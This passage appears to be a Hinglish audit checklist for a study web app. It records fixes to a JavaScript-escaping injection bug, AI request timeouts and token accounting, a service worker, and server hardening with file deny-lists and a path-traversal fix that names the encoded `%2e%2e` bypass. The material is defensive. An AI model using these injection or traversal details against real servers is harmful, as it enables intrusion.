- Gemini fetch + JSON-extraction + retry logic (`gemini-service`, `answer-writing-service`, `notification-summary-service`, `ai-teacher-service` — chaaron mein alag-alag copy)
- Bilingual (English/Hindi) content handling
- Date formatting (`new Date().toISOString().split('T')[0]` poore codebase mein bikhra hua)

**Fix plan:**
- [x] `js/ai-client.js` — single Gemini transport (Phase 1 mein ho gaya)
- [x] `js/ui-utils.js` — escaping, downloads, jsPDF resolution, TTS, date helpers
- [ ] Toast/modal/empty-state builders — **deferred**, reason neeche

**Kya consolidate hua:**

| Idiom | Pehle | Ab |
|---|---|---|
| `escapeHtml` | 5 implementations | 1 (`SecurityUtils`), baaki delegate karte hain |
| `escapeJs` | 1 **buggy** implementation | 1 correct (`UIUtils.escapeJs`) |
| Blob download | 16 hand-rolled blocks | `UIUtils.downloadBlob/downloadText/downloadJson` |
| jsPDF resolution | 3 copies | `UIUtils.resolveJsPDF/requireJsPDF` |
| Date formatting | 38 inline calls | `toDateKey/formatDate/formatDuration/formatClock/daysUntil` |

**🔴 Isme ek real security bug fix hua — `escapeJs`:**
Purana code sirf quotes escape karta tha:
```js
(str || '').replace(/'/g, "\\'").replace(/"/g, '\\"')
```
Do tarah se toot-ta tha: (1) trailing backslash (`C:\`) escape ke escape ban kar string
jaldi terminate kar deta tha, (2) newline attribute value hi todh deta tha. Dono cases mein
user/AI text **executable code ban jaata tha**. Yeh `study-notes.js` mein glossary terms,
user-selected text, aur micro-quiz explanations par lag raha tha.
Naya version backslash pehle escape karta hai, phir quotes, newline, CR, tab, U+2028/2029,
aur `<` (taaki enclosing `</script>` band na ho). Test purane escaper ka literal actually
`vm.runInNewContext()` se evaluate karke prove karta hai ki woh SyntaxError deta tha aur
naya round-trip karta hai.

**Ek aur real bug mila aur fix hua — speech synthesis leak:**
6 views TTS start karte hain par `navigate()` sirf 2 ko stop karta tha (flashcards, ai-teacher).
Yaani Study Notes / Answer Writing / Tools mein kuch padhwa kar navigate karo to audio
chalta rehta tha, bina rokne ke kisi tarike ke. Browser ka speech queue single hai, isliye
`navigate()` mein ek central `UIUtils.stopSpeaking()` add kiya — ek line mein saare 6 views cover.
Per-view `stopSpeech()` calls bhi rakhe, kyunki woh button label aur `isSpeaking` flag reset karte hain.

**Blob download ke saath ek latent bug bhi theek hua:** kai copies `URL.revokeObjectURL()`
`click()` ke turant baad synchronously call karti thin, jo kuch browsers mein download cancel
kar deta hai; doosri copies 10-second timer use karti thin jo tab band hone par leak hota tha.
`downloadBlob()` anchor ko DOM se remove karta hai aur revoke ko defer karta hai.

**Toast/modal builders kyun defer kiye:** toast pattern already `app.showToast()` mein centralized
hai — sirf call-site guards (`window.app && ...` vs bare `app.`) inconsistent hain, jo cosmetic hai.
Modal builders per-view stateful hain (flashcards deck creator, study-notes quiz config); unhe ek
generic builder mein merge karna behaviour change ka risk rakhta hai jise main browser mein
verify nahi kar sakta. Confirm dialog — jo sabse zyada shared hai — already Phase 2/4 mein
proper cancel + focus trap ke saath standardize ho gaya.

---

### [x] M6. AI calls mein timeout / abort / rate-limit nahi hai ✅ FIXED

**Files:** saare AI services

Observed gaps:
- [x] `AbortController` — `aiClient` har request track karta hai, navigate par `abortAll()`
- [x] Request timeout — 120s default, clear error message ("timed out after 120s")
- [x] Concurrency cap — `beginGeneration()` doosri parallel generation refuse karta hai
- [x] Server-side rate limiting — 20 req/60s (L3 mein ho gaya tha)
- [x] "Cancel generation" button overlay mein
- [x] Token/cost accounting — **ab ho gaya** (neeche detail)

**Token accounting (follow-up mein add kiya):**
Gemini per-token bill karta hai aur free tier par daily limit hai, par app kuch report
nahi karta tha — ek runaway batch loop chup-chaap quota khatam kar sakta tha.
`ai-client.js` single choke point hai, isliye accounting wahin add ki:
- **Exact counts, estimate nahi** — Gemini response mein khud `usageMetadata`
  (`promptTokenCount` / `candidatesTokenCount` / `totalTokenCount`) bhejta hai. Usse
  padhne ke liye `response.clone().json()` use kiya, taaki **caller ka body untouched rahe**.
  Yeh sabse critical property hai — regress hone par har AI feature
  "body already read" se toot jaata. Test isko explicitly assert karta hai.
- Daily + per-session totals, midnight par daily reset, `localStorage` mein persist
  (session totals persist nahi hote, woh per-tab hain).
- Failed responses count nahi hote (429 par counters nahi badhte).
- Pre-flight `estimatePayloadTokens()` — 25k tokens se bade request par console warning
  jisme remedy bhi likha hai ("narrower page range or fewer questions"). Block nahi karta,
  sirf warn karta hai.
- Devanagari ko zyada weight diya estimate mein, kyunki woh Latin se kam efficiently tokenise hota hai.
- Settings mein visible: Today requests / total tokens / input-output split / session, plus Reset button.

**Saath mein ek real gap bhi band hua:** `evaluateAnswer()` **ekmatra prompt tha jiska input
cap nahi tha** — poora student answer ~5 KB rubric ke upar interpolate ho raha tha. Koi
150-word answer ki jagah pura document paste kar deta to context window blow ho jaata aur
request reject. Ab 24000 chars (~4000 words) par cap hai, aur truncation prompt mein
disclose hoti hai taaki model ko pata rahe ki text adhoora hai.

**Kaise implement hua:**
- Transport primitives Phase 1 mein hi `ai-client.js` mein aa gaye the (controller registry,
  timeout, `abortAll()`, `inFlightCount`). Phase 4 mein unhe UI se wire kiya.
- Naya lifecycle `app.js` mein: `beginGeneration(label)` / `endGeneration()` /
  `cancelGeneration()` / `isGenerationCancelled()`. Overlay open/close ab **ek hi jagah** hota hai
  (pehle 6 files mein bikhra tha aur har jagah reset logic duplicate tha).
- `cancelGeneration()` `aiClient.abortAll()` call karta hai — request actually ruk jaati hai,
  quota bachta hai. Pehle overlay band ho jaata par request chalti rehti thi aur mar chuke view
  mein result likhne ki koshish karti thi.
- `navigate()` bhi orphaned AI requests abort karta hai.
- Cancel ke baad "Generation failed" error toast nahi aata (`isGenerationCancelled()` check),
  warna user ko apne hi cancel ka error dikhta.
- Double-click se do parallel generations start ho jaati thi — ab nahi.

---

### [x] M7. Global `mousemove` spotlight handler mehenga hai ✅ FIXED

**File:** `js/app.js:76-107`

```js
document.addEventListener('mousemove', (e) => {
  ...
  const cards = document.querySelectorAll('.metric-card, .hero-card, .quiz-list-item, .chart-card, .dropzone-area, .option-card, .question-card, .result-hero-card, .glass-panel, .spotlight-card');
  cards.forEach((card) => { const rect = card.getBoundingClientRect(); ... });
});
```

rAF-throttled hai (achha), par har frame par: 10-selector DOM query + har matched element par `getBoundingClientRect()` (forced layout). Notes/tools views mein bahut `.glass-panel` hote hain → noticeable jank.

**Fix plan:**
- [x] Event delegation via `closest()` — cache karne ki zaroorat hi nahi padi
- [x] `(hover: hover) and (pointer: fine)` se touch devices par poora skip
- [x] `prefers-reduced-motion` respect (yeh purely decorative effect hai)
- [x] Listener `{ passive: true }`

**Key insight jo investigation se mila:** CSS check karne par pata chala ki sirf **3 rules**
`--mouse-x` use karte hain (`.spotlight-card::before`, `.metric-card::before`, `.hero-card::after`)
aur teeno `opacity: 0` par hain jab tak `:hover` na ho. Matlab **sirf cursor ke neeche wale
card ka spotlight kabhi visible hota hai**.

Purana code 10 selectors query karta tha (jisme `.glass-panel` bhi tha, jo lagbhag har cheez
par hai), har match par `getBoundingClientRect()` call karta tha, aur 60px proximity margin
ke andar aane wale sab cards ke variables update karta tha — yaani **har frame mein dozens
forced layouts, invisible elements ke liye**.

`closest()` se hovered card nikalna **exactly same visual output** deta hai — ek rect read se.
Selector bhi narrow kar diya un 3 classes tak jo actually variables consume karti hain.

Saath mein ek chhota bug bhi theek hua: purana code `if (spotlightRaf) return` guard ke saath
frame ke **pehle** event ke coordinates use karta tha aur baad wale discard kar deta tha,
to glow cursor se peeche reh jaata tha. Ab latest position use hoti hai.

Test yeh bhi verify karta hai ki narrowed selector CSS ke actual consumers se match karta hai,
taaki future mein koi naya `--mouse-x` rule add kare to test fail ho.

---

## 🟢 LOW — Polish

### [x] L1. `package.json` dependencies incomplete lagti hain ✅ ADDRESSED
`dependencies` mein sirf `pdf-lib` hai, par `node_modules` bada hai aur vendor libs `assets/vendor/` mein manually copied hain. Audit karo ki actually kya chahiye. `server.js` zero-dependency hai (sirf built-in `http`/`fs`/`https`) — to `pdf-lib` runtime par kahan use hota hai? Client side `assets/vendor/pdf-lib.min.js` se aata hai.
- [x] `scripts` add kiye (`npm test`, `npm run check`), `devDependencies` mein `jsdom` record kiya
- [x] Confirm kiya: `pdf-lib` client-side `assets/vendor/pdf-lib.min.js` se aata hai, npm se nahi.
      `server.js` zero-dependency hai (sirf built-in `http`/`fs`/`path`/`https`).
      Vendor bundles jaan-boojh kar committed hain taaki app offline chale — isliye unhe
      npm se sync karne ka script **nahi** add kiya, woh offline guarantee todh deta.

### [x] L2. `scratch/` folder mein ad-hoc test scripts ✅ ADDRESSED
`test-ai-teacher.js`, `test_bilingual_full_suite.js`, `verify_complete_notes_and_40pct_summary.js` etc. — standalone scripts hain, koi test runner nahi.
- [x] Proper runner ban gaya: `scratch/run-all-checks.js` → `npm test`. 8 suites, 395 checks,
      single pass/fail summary, failing lines automatically surface karta hai.
- [x] `scratch/` ab server se blocked hai (L3 deny-list), to yeh scripts public nahi hain.
- [ ] Purane exploratory scripts (`test_bilingual_full_suite.js` etc.) migrate nahi kiye —
      woh live API key maangte hain aur manual inspection ke liye bane the, isliye automated
      suite se bahar rakhna hi theek hai. Naye suites unki functional coverage replace karte hain.

### [x] L3. `server.js` — production hardening missing ✅ FIXED
- [x] Static files par proper `Cache-Control` (vendor immutable 1 saal, images 7 din, html/css/js `no-cache`)
- [x] Static files se blanket `Access-Control-Allow-Origin: *` hataya (sirf API endpoints par raha)
- [x] `/api/gemini` par rate limiting — 20 req/60s per IP, `Retry-After` header ke saath
- [x] POST body 2 MB par capped → `413` (pehle `body += chunk` unbounded tha)
- [x] Security headers: `X-Content-Type-Options`, `Referrer-Policy`, `X-Frame-Options`, `Permissions-Policy`

**Extra jo isi kaam mein mila aur fix hua:**
- [x] **Web root == project root tha**, to `server.js`, `package.json`, `live-exams-scraper.js`, `README.md`
      aur `scratch/` ke scripts sab browser se download ho sakte the. Ab `SERVABLE_EXTENSIONS` allow-list +
      `DENIED_FILES` + `DENIED_PREFIXES` + dotfile/`.bak`/`.ps1` blocking hai. Unknown extensions
      ab `404` dete hain, `application/octet-stream` nahi.
- [x] Model identifier regex se validate hota hai → path traversal se arbitrary Google endpoint hit nahi kar sakte
- [x] Malformed JSON body upstream jaane se pehle `400` deta hai (wasted quota bachti hai)
- [x] Upstream Gemini call par 120s timeout (`AbortSignal.timeout`)
- [x] `decodeURIComponent` traversal check se *pehle* (warna `%2e%2e` bypass ho sakta tha)
- [x] Static stream par error handling
- [x] Startup log batata hai kaunsa Gemini mode active hai (PROXY vs DIRECT)
- [x] Naya `GET /api/gemini/status` endpoint — sirf boolean deta hai, key kabhi nahi

**Verified:** `scratch/verify-server-hardening.ps1` — 23/23 pass (private files 404, app files 200,
SPA deep-link fallback intact). `scratch/verify-proxy-limits.ps1` — 400/413/429 guards confirm.

### [x] L4. SEO / PWA ✅ FIXED
- [x] `index.html` mein rich meta + Schema.org already tha (achha kaam) — chhoda waisa hi
- [x] `manifest.webmanifest` banaya — installable PWA, 4 app shortcuts (Create Quiz / AI Teacher /
      Flashcards / Exams), maskable icon, theme colors. `<link rel="manifest">` + `apple-touch-icon` add kiye
- [x] `sitemap.xml` banaya — `robots.txt` pehle se ek non-existent sitemap point kar raha tha (dangling reference)
- [x] `robots.txt` tighten kiya (`/css/`, `/api/` bhi disallow)
- [x] `og:site_name` + `og:image:alt` add kiye
- [x] `og:image` relative hi rakha, **par clearly documented** ki deploy par absolute karna zaroori hai —
      main koi domain invent nahi kar sakta tha. Same note `sitemap.xml` aur `robots.txt` mein bhi hai.
- [x] Service worker **ab ban gaya** — `sw.js`, soch-samajh kar designed (neeche)

**Service worker kaise safely banaya:**
Pehle isse defer kiya tha kyunki galat-configured SW hamesha stale code serve karta hai aur
debug karna dard hai. Strategy specifically usse bachne ke liye chuni:

| Kya | Strategy | Kyun |
|---|---|---|
| App code (`/js/`, `/css/`), HTML | **network-first** | Aapke edits next reload par dikhte hain, bilkul waise hi jaise bina SW. Cache sirf offline fallback hai. |
| `assets/vendor/`, `assets/icons/` | **cache-first** | Versioned, immutable bundles. 3.6 MB transfer bachta hai. |
| `/api/` | **network-only, never cached** | AI response ya live exam data cache karna stale answers replay karega. |

- `CACHE_VERSION` bump karne par `activate` par saare purane caches delete ho jaate hain.
- Install par `cache.addAll()` **nahi** use kiya — woh ek 404 par pura install fail kar deta hai.
  `Promise.allSettled` se per-asset add hota hai aur jo fail hue unhe log karta hai.
- **Lazy/eager split:** boot ke liye zaroori 62 assets precache hote hain; bhaari PDF bundles
  (pdf.worker 1 MB, html2pdf 885 KB, pdf-lib 513 KB, jspdf 356 KB — total ~3.1 MB) pehli
  baar use hone par cache hote hain. Install fast rehta hai aur jo session PDF tools chhuta hi
  nahi uska transfer bachta hai. `pdf.worker.min.js` khaas dhyan se handle kiya kyunki PDF.js
  usse dynamically load karta hai, woh kisi `<script>` tag mein nahi hai.
- Offline par hash routes (`#flashcards`) bhi chalte hain — navigation cached shell par fall back karti hai.
- **Escape hatch:** `app.clearServiceWorker()` console se, plus SW mein `CLEAR_CACHES` message
  handler, plus manual commands `sw.js` ke header comment mein documented.
- Naya version ready hone par user ko toast dikhta hai ("Reload to update"), chupchaap wait nahi karta.
- Registration `try/catch` mein hai — SW fail ho to app normally chalta rehta hai.

**Verified:** `verify-service-worker.js` (42 checks) — strategy assertions, saare 62 precache
paths disk par exist karte hain, index.html ke saare 24 stylesheets + 34 boot-critical scripts
precached hain, heavy bundles jaan-boojh kar excluded hain, `/api/` never cached.
Plus `verify-sw-precache-served.ps1` — sw.js `no-cache` serve hota hai, manifest correct
content-type deta hai, saare 62 precache assets + 6 lazy vendor bundles fetchable hain
(vendor `immutable` cache header ke saath), aur `/api/gemini/status` `no-store` hai.

> **Note:** `server.js` ke `SERVABLE_EXTENSIONS` allow-list mein `.xml` aur `.webmanifest`
> add karna pada, warna L3 ka deny-list in naye public files ko 404 kar deta.

### [x] L5. Chhoti cheezein ✅ FIXED
- [x] `assets/icons/hamsa-logo-3d.png.bak` delete kiya (yeh L3 se pehle publicly downloadable bhi tha)
- [x] `study-notes.js` ka `console.log` → `console.warn`, plus ek comment jo batata hai
      ki `Range.surroundContents()` kab throw karta hai aur highlight phir bhi saved rehta hai
- [x] `window.onerror` ab `return !this.isDevEnvironment()` karta hai — localhost par browser ka
      apna error reporting (stack traces) bacha rehta hai, production mein user-friendly toast
- [x] Streak `localStorage` par hi hai par **ab backup mein include hai** (C3), to restore
      ke baad streak aur last-active-date dono bach jaate hain — inconsistency khatam

---

## ✅ Jo already achha hai (change na karein)

Yeh cheezein review mein solid nikli:

- **`js/sanitizer.js`** — DOMParser-based sanitizer, allow-list approach, `javascript:`/`data:`/`vbscript:` protocol blocking, `on*` attribute stripping, CSS `expression`/`url()` filtering, links par forced `rel="noopener noreferrer"`. Well designed.
- **`prefers-reduced-motion` support** — `css/responsive.css:246` mein proper implementation: aurora orbs / orbital rings / sparkle dots disabled, aur global animation+transition duration collapse. Accessibility ka yeh part theek se handle kiya gaya hai.
- **`EligibilityEngine`** ka structure — pure logic, no UI coupling, category relaxation, qualification hierarchy via `satisfies` array, `'VERIFY'` tri-state for in-progress degrees, CGPA conversion par honest warning. Logic sahi hai; sirf input data (H7) problem hai.
- **Dexie schema versioning** — `version(1)` se `version(7)` tak clean incremental migrations.
- **`migrateLegacyNote()`** — backward compatibility ke liye flat notes ko structured sections mein migrate karna, defensive defaults ke saath.
- **SM-2 spaced repetition** (`saveCardReviewProgress()`) — 4-rating scale, ease factor floor at 1.3, interval progression. Standard algorithm theek se implement hua hai.
- **Debug hygiene** — poore `js/` mein sirf 1 leftover `console.log`. Bahut saaf.
- **Icon refresh debouncing** — `app.refreshIcons()` rAF se batch karta hai, har render par `lucide.createIcons()` spam nahi hota.
- **Offline detection** — `online`/`offline` events + visual banner + `isOnline()` guard helper.
- **Directory traversal guard** — `server.js` mein `filePath.startsWith(PUBLIC_DIR)` check present hai.

---

## Recommended Order of Work

**Phase 1 — Trust & Safety** (yeh pehle)
1. C1 — API key proxy par move karo
2. C2 — Backup import safe banao
3. C3 — Backup complete karo

**Phase 2 — Quiz Integrity** (core feature ka bharosa)
4. H1 — Timer leak fix
5. H2 — Mid-quiz persistence
6. H3 — Wall-clock timer
7. H4 — Negative marking

**Phase 3 — Data Honesty**
8. H6 — Fake random data hatao
9. H7 — Eligibility confidence honest karo
10. H5 — Attempt history

**Phase 4 — Hardening**
11. M1, M2, M3 (quick wins: duplicate function, sanitizer audit, focus styles)
12. M6 — AI abort/timeout
13. L3 — Server hardening (C1 ke baad zaroori)

**Phase 5 — Maintainability**
14. M4, M5, M7
15. L1, L2, L4, L5
